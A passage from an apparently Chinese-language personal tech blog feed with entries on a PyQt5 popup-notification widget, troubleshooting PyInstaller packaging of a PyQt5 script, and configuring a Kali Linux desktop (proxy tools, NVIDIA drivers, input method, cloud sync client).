punctuation">,</span> QtWidgets<span class="token keyword">import</span> base64<span class="token keyword">import</span> traceback<span class="token keyword">class</span> <span class="token class-name">PopupBubble</span><span class="token punctuation">(</span>QtWidgets<span class="token punctuation">.</span>QDialog<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> title<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> duration<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            QtWidgets<span class="token punctuation">.</span>QDialog<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>duration <span class="token operator">=</span> duration            self<span class="token punctuation">.</span>title_label <span class="token operator">=</span> QtWidgets<span class="token punctuation">.</span>QLabel<span class="token punctuation">(</span>self<span class="token punctuation">.</span>make_bold<span class="token punctuation">(</span>title<span class="token punctuation">)</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>title_label<span class="token punctuation">.</span>setWordWrap<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>title_label<span class="token punctuation">.</span>setAlignment<span class="token punctuation">(</span>QtCore<span class="token punctuation">.</span>Qt<span class="token punctuation">.</span>AlignCenter<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>msg_label <span class="token operator">=</span> QtWidgets<span class="token punctuation">.</span>QLabel<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>msg_label<span class="token punctuation">.</span>setWordWrap<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>icon_button <span class="token operator">=</span> QLabelButton<span class="token punctuation">(</span><span class="token punctuation">)</span>            img_b64 <span class="token operator">=</span> <span class="token string">"iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAABHNCSVQICAgIfAhkiAAAAAlwSFlzAAAITgAACE4BjDEA7AAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAABJdEVYdENvcHlyaWdodABQdWJsaWMgRG9tYWluIGh0dHA6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL3B1YmxpY2RvbWFpbi9Zw/7KAAAB2ElEQVRIibWVPW/TUBiFz7mJTBFSGgnUqmABRgpMUYi53pCK1IWxUxd2BgYk/goDAzuq+AFILEhIZUuq/ACPrYRKGSJPdHkPQx3UOK7tJOKd7Guf57nXH++lJFRVr9e70el03pLcBnAnH/4t6SzLsvdpml5U5duVdABhGDLLsj6AjSvD9wFshWHIujzrVgBcrqLb7b6U9AoASH6aTqdf62YPAK6WDiBN0wszO52dm9lpEzhQs4LhcNhzzj13zj2TtDUXJH+Z2bGZ/ZhMJulSApL03r+WtNdoluS38Xj8USWw0kcUx/F+UzgASNqL43i/7NqCwHu/A+CgKfxKHeTZagGAPsnWsvQ8028ieLIsvCq7IJD0eFV6WXZO4L3fzFvCSkVy23u/ea2A5KNV4dcx5gRm9nBdQZFRfAcP1hUUGXMC59zagiLjn2AwGNwCsPCjrFA7OWteEATBrqRG3bWqJLkgCHZn523gsrnFcdwi+YXkrGEJAMxMs+OSonNutukwF9DMWiQpSUyS5Kmku+vOvKzM7KxtZu8A3PwfAgB/2iQ/m9m9qrtIxgBuF4bPJY1qBD8b7clJkryQ9KYg/TAajb7XZRt9NVEUHUk6BHAC4ETSYRRFR02yfwEMBLRPQVtfqgAAAABJRU5ErkJggg=="</span>            pixmap <span class="token operator">=</span> QtGui<span class="token punctuation">.</span>QPixmap<span class="token punctuation">(</span><span class="token punctuation">)</span>            pixmap<span class="token punctuation">.</span>loadFromData<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>img_b64<span class="token punctuation">)</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>icon_button<span class="token punctuation">.</span>setPixmap<span class="token punctuation">(</span>pixmap<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>icon_button<span class="token punctuation">.</span>resize<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span>            title_layout <span class="token operator">=</span> QtWidgets<span class="token punctuation">.</span>QVBoxLayout<span class="token punctuation">(</span><span class="token punctuation">)</span>            title_layout<span class="token punctuation">.</span>addWidget<span class="token punctuation">(</span>self<span class="token punctuation">.</span>title_label<span class="token punctuation">)</span>            title_layout<span class="token punctuation">.</span>addWidget<span class="token punctuation">(</span>self<span class="token punctuation">.</span>msg_label<span class="token punctuation">)</span>            layout <span class="token operator">=</span> QtWidgets<span class="token punctuation">.</span>QHBoxLayout<span class="token punctuation">(</span><span class="token punctuation">)</span>            layout<span class="token punctuation">.</span>addWidget<span class="token punctuation">(</span>self<span class="token punctuation">.</span>icon_button<span class="token punctuation">)</span>            layout<span class="token punctuation">.</span>addLayout<span class="token punctuation">(</span>title_layout<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>setGeometry<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">300</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>setLayout<span class="token punctuation">(</span>layout<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># self.setWindowFlags(QtCore.Qt.FramelessWindowHint | QtCore.Qt.WindowStaysOnTopHint)</span>            self<span class="token punctuation">.</span>setWindowFlags<span class="token punctuation">(</span>QtCore<span class="token punctuation">.</span>Qt<span class="token punctuation">.</span>FramelessWindowHint<span class="token punctuation">)</span>            setWinBottomRight<span class="token punctuation">(</span>self<span class="token punctuation">)</span>            QtCore<span class="token punctuation">.</span>QTimer<span class="token punctuation">.</span>singleShot<span class="token punctuation">(</span>self<span class="token punctuation">.</span>duration <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">,</span> self<span class="token punctuation">.</span>close<span class="token punctuation">)</span>            self<span class="token punctuation">.</span>installEventFilter<span class="token punctuation">(</span>self<span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            traceback<span class="token punctuation">.</span>print_exc<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># db.insert_error_log(phone="")</span>    <span class="token keyword">def</span> <span class="token function">eventFilter</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> source<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""label_path 鼠标点击事件"""</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> event<span class="token punctuation">.</span>type<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> QtCore<span class="token punctuation">.</span>QEvent<span class="token punctuation">.</span>MouseButtonPress<span class="token punctuation">:</span>                self<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> QtWidgets<span class="token punctuation">.</span>QWidget<span class="token punctuation">.</span>eventFilter<span class="token punctuation">(</span>self<span class="token punctuation">,</span> source<span class="token punctuation">,</span> event<span class="token punctuation">)</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            traceback<span class="token punctuation">.</span>print_exc<span class="token punctuation">(</span><span class="token punctuation">)</span>            db<span class="token punctuation">.</span>insert_error_log<span class="token punctuation">(</span>phone<span class="token operator">=</span>self<span class="token punctuation">.</span>user_info<span class="token punctuation">[</span><span class="token string">"phone"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">make_bold</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token string">"&lt;b>"</span> <span class="token operator">+</span> text <span class="token operator">+</span> <span class="token string">"&lt;/b>"</span>        <span class="token keyword">except</span><span class="token punctuation">:</span>            traceback<span class="token punctuation">.</span>print_exc<span class="token punctuation">(</span><span class="token punctuation">)</span>            db<span class="token punctuation">.</span>insert_error_log<span class="token punctuation">(</span>phone<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">QLabelButton</span><span class="token punctuation">(</span>QtWidgets<span class="token punctuation">.</span>QLabel<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> parent<span class="token punctuation">)</span><span class="token punctuation">:</span>        QLabel<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>self<span class="token punctuation">,</span> parent<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">mouseReleaseEvent</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> ev<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>emit<span class="token punctuation">(</span>QtCore<span class="token punctuation">.</span>SIGNAL<span class="token punctuation">(</span><span class="token string">'clicked()'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">setWinBottomRight</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">:</span>    br <span class="token operator">=</span> QtWidgets<span class="token punctuation">.</span>QDesktopWidget<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>availableGeometry<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>bottomRight<span class="token punctuation">(</span><span class="token punctuation">)</span>    size <span class="token operator">=</span> app<span class="token punctuation">.</span>size<span class="token punctuation">(</span><span class="token punctuation">)</span>    x <span class="token operator">=</span> br<span class="token punctuation">.</span>x<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> size<span class="token punctuation">.</span>width<span class="token punctuation">(</span><span class="token punctuation">)</span>    y <span class="token operator">=</span> br<span class="token punctuation">.</span>y<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> size<span class="token punctuation">.</span>height<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>move<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">popup</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> duration<span class="token punctuation">)</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> QtWidgets<span class="token punctuation">.</span>QApplication<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span>    toast <span class="token operator">=</span> PopupBubble<span class="token punctuation">(</span>title<span class="token punctuation">,</span> msg<span class="token punctuation">,</span> duration<span class="token punctuation">)</span>    toast<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>exec_<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    popup<span class="token punctuation">(</span>title<span class="token operator">=</span><span class="token string">"这个是标题"</span><span class="token punctuation">,</span>          msg<span class="token operator">=</span><span class="token string">"这个是内容!"</span><span class="token punctuation">,</span>          duration<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Qt </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mac系统通知 </tag>
            
            <tag> 通知中心 </tag>
            
            <tag> windows系统通知 </tag>
            
            <tag> linux系统通知 </tag>
            
            <tag> 系统提示 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pyinstaller打包遇到的坑</title>
      <link href="/2018/11/27/pyinstaller-da-bao-yu-dao-de-keng/"/>
      <url>/2018/11/27/pyinstaller-da-bao-yu-dao-de-keng/</url>
      
        <content type="html"><![CDATA[<h1 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h1><blockquote><p>例子使用<code>pachonggui.py</code></p></blockquote><ol><li><p>正常执行一遍</p><pre><code> pyinstaller -Fw pachonggui.py</code></pre> <a id="more"></a></li><li><p>给脚本加一行代码</p><pre class=" language-python3"><code class="language-python3"> import PyQt5.sip</code></pre><p> 然后再执行同样的命令</p><pre><code> pyinstaller -Fw pachonggui.py</code></pre></li><li><p>删掉<code>import PyQt5.sip</code>，可以继续写代码了。如果要打包，从<code>1</code>开始</p></li></ol><h2 id="出现failed-to-execute-script的排查方法"><a href="#出现failed-to-execute-script的排查方法" class="headerlink" title="出现failed to execute script的排查方法"></a>出现<code>failed to execute script</code>的排查方法</h2><h3 id="法一"><a href="#法一" class="headerlink" title="法一:"></a>法一:</h3><p>命令执行完毕之后 <code>build\pachonggui\warnpachonggui.txt</code>,上面会<strong>记载着错误</strong></p><h3 id="法二"><a href="#法二" class="headerlink" title="法二:"></a>法二:</h3><pre><code># 使用完下面这条指令之后,打开exe,提示failed to execute scriptpyinstaller -Fw pachonggui.py# 然后执行下面这条执行,会在list下生成一个目录,进入该目录,用**命令行**执行该exe,就会看到错误了pyinstaller -D pachonggui.py</code></pre><pre><code>pyinstaller打包使用pyqt5模块的时候，在win平台下，由于pyinstaller无法准确获取QT动态库文件路径，会报错导致无法打开运行程序，并提示错误信息pyinstaller failed to execute script pyi_rth_qt5plugins此时我们需要在打包的时候直接告诉pyinstaller到哪里去找，这个路径分隔符需要是unix形式：pyinstaller --paths C:/****/Python/Python35-32/Lib/site-packages/PyQt5/Qt/bin -F -w ****.py</code></pre><h1 id="pyqt5打包问题经过"><a href="#pyqt5打包问题经过" class="headerlink" title="pyqt5打包问题经过"></a>pyqt5打包问题经过</h1><blockquote><p>这里用到的文件是<code>pachonggui.py</code>,里面使用了pyqt5 的库</p></blockquote><p>安装好<code>pyinstaller</code>后,先使用下面的命令对脚本进行打包</p><pre class=" language-shell"><code class="language-shell">pyinstaller.exe -Fw .\pachonggui.py</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1533799324.jpg" alt></p><p>执行完毕,生成两个目录</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1533799377.jpg" alt></p><p><code>exe</code>文件在<code>dist</code>目录下</p><p>双击运行出现<code>Failed to execute script pachonggui</code>错误</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1533799888.jpg" alt></p><p>先去<code>build</code>目录那里,找到<code>warn***.txt</code>文件,里面会记录一些错误</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1533799475.jpg" alt></p><p>这里可以看到,<code>pyqt5</code>的库没有找到</p><p><strong>分析</strong>:正常来说,如果<code>pyinstaller</code>是<code>pip3</code>安装好的,那么<code>pyqt5</code>应该也在同一个目录下,应该不会出现找不到路径的情况.所以说,有两种情况,一个是<code>pyinstaller</code>错了,一个是<code>pyqt5</code>错了,这里我先指定<code>pyqt5</code>的路径让它试试</p><p>找到python3的安装路径,我的是如下</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1533800027.jpg" alt></p><p>然后使用<code>--path</code> 指定库目录,有一点需要注意:这里用的是<code>/</code>作为目录分隔符,而不是<code>\</code></p><pre class=" language-shell"><code class="language-shell">pyinstaller.exe --path E:/Python/Python36-32/Lib/site-packages/PyQt5/Qt/bin -Fw .\pachonggui.py</code></pre><p>重新打包之后,再次运行,报同样的错误,看<code>build</code>目录下的<code>warn***.txt</code>文件,还是同样的,没有找到<code>PyQt5</code>的库</p><p>因为本人安装了<code>python2.7</code>和<code>python3.6</code>,但是我只给python2.7配置了环境变量,所以说,命令行那里的<code>pyinstaller</code>是<code>python27</code>目录下的,而不是<code>python36-32</code>目录下的,所以说,接下来,我命令提示符那里指定使用<code>python36-32</code>下的<code>pyinstaller</code>试试</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1533800703.jpg" alt></p><p>执行打包命令之后,看到命令提示符,多了一些东西<code>sip not found</code>,不管它先,先记下来,然后继续运行一下<code>exe</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1533800781.jpg" alt></p><p>没错,还是这个错误… …</p><p>看一下<code>warn***.txt</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1533800824.jpg" alt></p><p>发现pyqt5已经成功导入了,说明之前的错误原因真是因为调用了<code>python27</code>的<code>pyinstaller</code>,指定使用<code>python36-32</code>下的<code>pyinstaller</code>就没毛病了</p><p>这时候的<code>warn***.txt</code>是一大堆的看不懂的东西… …怎么办?</p><p>没关系,还有办法,使用<code>-D</code>指令,将这个exe弄成一个目录,然后使用命令行去运行新目录下的exe,然后你应该会看到报错误了</p><pre class=" language-shell"><code class="language-shell">E:\Python\Python36-32\Scripts\pyinstaller.exe -D .\pachonggui.py</code></pre><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1533801080.jpg" alt></p><p>这时候<code>dist</code>目录下会多一个目录<code>pachonggui</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1533801107.jpg" alt></p><p>然后,在这里,我需要使用<code>命令提示符</code>去运行这个<code>exe</code></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1533801253.jpg" alt></p><p>结果如下:</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1533801281.jpg" alt></p><p>… …<code>PyQt5.sip</code>是什么东东???我代码里面没有用到啊!!!<del>~</del></p><p>在这种情况下,我决定,手动在代码里面加入它,然后再执行一次打包命令</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1533801753.jpg" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1533801883.jpg" alt></p><p>不明白为什么提示<code>sip not found</code>还在,但是,这时候,exe已经可以运行,没有bug了</p>]]></content>
      
      
      <categories>
          
          <category> Qt </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pyinstaller </tag>
            
            <tag> pyqt打包 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali配置</title>
      <link href="/2018/11/15/kali-pei-zhi/"/>
      <url>/2018/11/15/kali-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="系统安装"><a href="#系统安装" class="headerlink" title="系统安装"></a>系统安装</h2><blockquote><p>据博主亲测,Kali从2018年版本开始,再用<code>UltraISO</code>之类的软件制作U盘启动盘来装Kali系统,都会出现下图的问题,百度和google上有很多解决方案,然并卵.</p></blockquote><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1529331889.jpg" alt></p><p>今天偶然发现了一款U盘制作软件—<code>Rufus</code>,可以去<a href="https://rufus.akeo.ie/" target="_blank" rel="noopener">官网</a> 下载,在用<code>Rufus</code>制作启动U盘的时候,选择后U盘和Kali的安装文件,点击<code>开始</code>,这时候只要选择如下图的<code>DD</code>模式,就会正常安装Kali了.</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1529332318.jpg" alt></p><a id="more"></a><h2 id="软件安装"><a href="#软件安装" class="headerlink" title="软件安装"></a>软件安装</h2><h3 id="1-shadowsocks-qt5"><a href="#1-shadowsocks-qt5" class="headerlink" title="1. shadowsocks-qt5"></a>1. shadowsocks-qt5</h3><blockquote><p>身在华夏,当然免不了被墙,而Kali的官方源是国外的服务器,所以,那速度…无法忍受,当然,也可以用国内的源,然后,博主的强迫症发作,因此决定用<code>ss-qt5</code>出去溜达溜达!说起来,现在连<code>ss-qt5</code>都用<code>Appimage</code>这种跨平台的打包方式,我喜欢…</p></blockquote><h4 id="1-github搜索shadowsocks-qt5-gt-releases-gt-找到对应执行程序-Appimage-下载即可"><a href="#1-github搜索shadowsocks-qt5-gt-releases-gt-找到对应执行程序-Appimage-下载即可" class="headerlink" title="1. github搜索shadowsocks-qt5-&gt;releases-&gt;找到对应执行程序(Appimage)下载即可"></a>1. <a href="https://github.com/" target="_blank" rel="noopener">github</a>搜索<code>shadowsocks-qt5</code>-&gt;<code>releases</code>-&gt;找到对应执行程序(Appimage)下载即可</h4><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1529336937.jpg" alt></p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1529337025.jpg" alt></p><h4 id="2-可以说-所有的Appimage程序都是用以下的方式运行的"><a href="#2-可以说-所有的Appimage程序都是用以下的方式运行的" class="headerlink" title="2. 可以说,所有的Appimage程序都是用以下的方式运行的"></a>2. 可以说,所有的Appimage程序都是用以下的方式运行的</h4><pre class=" language-shell"><code class="language-shell">chmod +x Shadoosocks-Qt5-3.0.1-x86_64.AppImage</code></pre><h4 id="3-双击运行-然后加入你服务器的配置就行"><a href="#3-双击运行-然后加入你服务器的配置就行" class="headerlink" title="3. 双击运行,然后加入你服务器的配置就行"></a>3. 双击运行,然后加入你服务器的配置就行</h4><h4 id="4-配置终端fq"><a href="#4-配置终端fq" class="headerlink" title="4. 配置终端fq"></a>4. 配置终端fq</h4><blockquote><p>终端不支持socks5协议,所以需要借助工具<code>proxychains4</code></p></blockquote><pre><code>git clone https://github.com/rofl0r/proxychains-ng.gitcd proxychains-ng./configure --prefix=/usr --sysconfdir=/etcmakesudo make installsudo make install-configsudo gedit /etc/proxychains4.conf</code></pre><h3 id="2-显卡驱动"><a href="#2-显卡驱动" class="headerlink" title="2. 显卡驱动"></a>2. 显卡驱动</h3><blockquote><p>装完Kali,当然得装显卡不懂啊,不然排热扇猛地在转,笔记本很快就没电了.<br>注意:在安装显卡之前,必须要更新完系统,命令如下</p></blockquote><pre class=" language-shell"><code class="language-shell">apt updateapt upgrade -yapt dist-upgrade -y</code></pre><h4 id="1-安装-Linux-内核头"><a href="#1-安装-Linux-内核头" class="headerlink" title="1. 安装 Linux 内核头"></a>1. 安装 Linux 内核头</h4><p>通过命令<code>uname -a</code>查看自己的内核版本</p><pre class=" language-shell"><code class="language-shell">apt install linux-headers-4.15.0-kali2-amd64 linux-headers-4.15.0-kali2-common linux-headers-4.15.0-kali2-all</code></pre><blockquote><p>ps:如果实在没有,可以试试<code>apt install linux-headers-*</code>全部安装</p></blockquote><h4 id="2-禁用默认使用的显卡驱动-nouveau。在命令行中输入"><a href="#2-禁用默认使用的显卡驱动-nouveau。在命令行中输入" class="headerlink" title="2. 禁用默认使用的显卡驱动 nouveau。在命令行中输入"></a>2. 禁用默认使用的显卡驱动 <code>nouveau</code>。在命令行中输入</h4><pre class=" language-shell"><code class="language-shell">echo -e "blacklist nouveau\noptions nouveau modeset=0\nalias nouveau off" > /etc/modprobe.d/blacklist-nouveau.conf</code></pre><p>应用刚刚的修改并重启系统</p><pre class=" language-shell"><code class="language-shell">update-initramfs -u && reboot</code></pre><h4 id="3-重启后-nouveau-应该被禁用了。在命令行中输入以下命令来确认-nouveau-被禁用"><a href="#3-重启后-nouveau-应该被禁用了。在命令行中输入以下命令来确认-nouveau-被禁用" class="headerlink" title="3. 重启后 nouveau 应该被禁用了。在命令行中输入以下命令来确认 nouveau 被禁用"></a>3. 重启后 <code>nouveau</code> 应该被禁用了。在命令行中输入以下命令来确认 <code>nouveau</code> 被禁用</h4><pre class=" language-shell"><code class="language-shell">lsmod |grep -i nouveau</code></pre><p>如果输入此命令后<strong>未显示任何内容</strong>，证明 <code>nouveau</code> 已被成功禁用。</p><h4 id="4-下载-NVIDA-官方驱动"><a href="#4-下载-NVIDA-官方驱动" class="headerlink" title="4. 下载 NVIDA 官方驱动"></a>4. 下载 NVIDA 官方驱动</h4><p>到 NVIDA 的官网下载对应型号的驱动 <a href="http://www.nvidia.com/Download/index.aspx?lang=en-us" target="_blank" rel="noopener">http://www.nvidia.com/Download/index.aspx?lang=en-us</a> ，注意，这里要选择和你显卡硬件型号对应的版本，否则一定失败。比如我的是 <code>GTX960M</code> 的笔记本显卡，所以我的选择如下图：</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1529338402.jpg" alt></p><p>点击<code>SEARCH</code> 后就可以看到 <code>DOWNLOAD</code> 的按钮了，点击下载就可以了</p><p><img src="https://raw.githubusercontent.com/fengwenhua/ImageBed/master/1529338471.jpg" alt></p><h4 id="5-安装"><a href="#5-安装" class="headerlink" title="5. 安装"></a>5. 安装</h4><p>下载好 NVIDA 的显卡驱动文件后，使用以下命令赋予执行权限</p><pre class=" language-shell"><code class="language-shell">chmod a+x NVIDIA-Linux-x86_64-390.67.run</code></pre><p>然后使用以下命令安装.注意,<strong>安装过程中会提示警告，全部选择 <code>yes</code></strong>。</p><pre class=" language-shell"><code class="language-shell">./NVIDIA-Linux-x86_64-384.98.run</code></pre><h4 id="6-配置"><a href="#6-配置" class="headerlink" title="6. 配置"></a>6. 配置</h4><p>安装完成之后,必须要配置一些东西,<strong>让Kali知道你使用的是什么显卡驱动</strong>,否则可能开机黑屏.</p><h5 id="1-查看显卡BusID"><a href="#1-查看显卡BusID" class="headerlink" title="1. 查看显卡BusID"></a>1. 查看显卡<code>BusID</code></h5><pre><code>nvidia-xconfig --query-gpu-info | grep &#39;BusID : &#39; | cut -d &#39; &#39; -f6</code></pre><p>它应该会显示如下的内容</p><pre><code>PCI:2:0:0</code></pre><p>这个就是我们需要的 <strong>BUS ID</strong></p><h5 id="2-创建一个-etc-X11-xorg-conf文件"><a href="#2-创建一个-etc-X11-xorg-conf文件" class="headerlink" title="2. 创建一个 /etc/X11/xorg.conf文件"></a>2. 创建一个 <code>/etc/X11/xorg.conf</code>文件</h5><pre class=" language-shell"><code class="language-shell">gedit /etc/X11/xorg.conf</code></pre><p>然后填入以下内容</p><pre class=" language-shell"><code class="language-shell">Section "ServerLayout"Identifier "layout"Screen 0 "nvidia"Inactive "intel"EndSectionSection "Device"Identifier "nvidia"Driver "nvidia"BusID "PCI:2:0:0"EndSectionSection "Screen"Identifier "nvidia"Device "nvidia"Option "AllowEmptyInitialConfiguration"EndSectionSection "Device"Identifier "intel"Driver "modesetting"EndSectionSection "Screen"Identifier "intel"Device "intel"EndSection</code></pre><p>注意,<strong>将<code>PCI:2:0:0</code>替换为自己的 <code>BUS ID</code></strong>，保存即可</p><h4 id="7-据我们的显示管理器-display-manager-来创建一些脚本"><a href="#7-据我们的显示管理器-display-manager-来创建一些脚本" class="headerlink" title="7. 据我们的显示管理器 (display manager)来创建一些脚本"></a>7. 据我们的显示管理器 (display manager)来创建一些脚本</h4><p>由于我们的 kali 默认使用的是 <code>GDM (Gnome Display Manager)</code>，我们需要创建两个文件：</p><pre class=" language-shell"><code class="language-shell">gedit /usr/share/gdm/greeter/autostart/optimus.desktopgedit /etc/xdg/autostart/optimus.desktop</code></pre><p>内容均为</p><pre class=" language-shell"><code class="language-shell">[Desktop Entry]Type=ApplicationName=OptimusExec=sh -c "xrandr --setprovideroutputsource modesetting NVIDIA-0; xrandr --auto"NoDisplay=trueX-GNOME-Autostart-Phase=DisplayServer</code></pre><h4 id="8-重启系统之后检测是否正常"><a href="#8-重启系统之后检测是否正常" class="headerlink" title="8. 重启系统之后检测是否正常"></a>8. 重启系统之后检测是否正常</h4><pre><code>apt install mesa-utilsglxinfo | grep -i &quot;direct rendering&quot;</code></pre><p>如果一切正常,应当显示</p><pre><code>direct rendering: Yes</code></pre><h4 id="3-安装输入法"><a href="#3-安装输入法" class="headerlink" title="3. 安装输入法"></a>3. 安装输入法</h4><ol><li>安装<pre><code>apt install ibus ibus-pinyin fcitx fcitx-googlepinyin  ibus-setup</code></pre></li><li>选择输入法<pre><code>Input Method-&gt;Add-&gt;汉语-&gt;pingyin</code></pre></li><li>输入源选择<pre><code>设置-&gt;区域和语言-&gt;输入源-&gt;汉语-&gt;拼音</code></pre></li></ol><h3 id="4-坚果云"><a href="#4-坚果云" class="headerlink" title="4. 坚果云"></a>4. 坚果云</h3><blockquote><p>国内的<code>Dropbox</code>,不能不用啊!!!然而却没有合适Kali版本的,ubuntu和debian版本我都试过了,用不了,只能用源码了</p></blockquote><pre><code>apt install libglib2.0-dev libgtk2.0-dev libnautilus-extension-dev gvfs-bin openjdk-8-jre-headlesswget http://www.jianguoyun.com/static/exe/installer/nutstore_linux_src_installer.tar.gztar zxf nutstore_linux_src_installer.tar.gzcd nutstore_linux_src_installer &amp;&amp; ./configure &amp;&amp; makemake installnautilus -q./runtime_bootstrap</code></pre><h3 id="5-root用户打开chrome"><a href="#5-root用户打开chrome" class="headerlink" title="5. root用户打开chrome"></a>5. root用户打开chrome</h3><blockquote><p>好吧!我也不知道为毛root用户打不开chrome</p></blockquote><p>使用文件管理器打开路径<code>/usr/share/applications/</code> ，找到<code>google-chrome</code>的图标，鼠标右键打开属性，在命令一栏<code>/usr/bin/google-chrome-stable %U</code> 的后面加上<code>--no-sandbox --user-data-dir &amp;</code>。<br>重新打开chrome即可</p><h3 id="6-终端设置快捷键"><a href="#6-终端设置快捷键" class="headerlink" title="6. 终端设置快捷键"></a>6. <code>终端</code>设置快捷键</h3><p>设置-&gt;设备-&gt;键盘-&gt;命令如下:</p><pre><code>gnome-terminal</code></pre><h3 id="7-添加add-apt-repository"><a href="#7-添加add-apt-repository" class="headerlink" title="7. 添加add-apt-repository"></a>7. 添加add-apt-repository</h3><blockquote><p> Kali Linux默认不含add-apt-repository，某些情况下并不方便。可以手动启用它来添加PPA。</p></blockquote><ul><li>首先安装软件属性程序包。<pre class=" language-shell"><code class="language-shell">apt install software-properties-common</code></pre></li><li>接下来安装<code>apt-file</code>。<pre class=" language-shell"><code class="language-shell">apt install 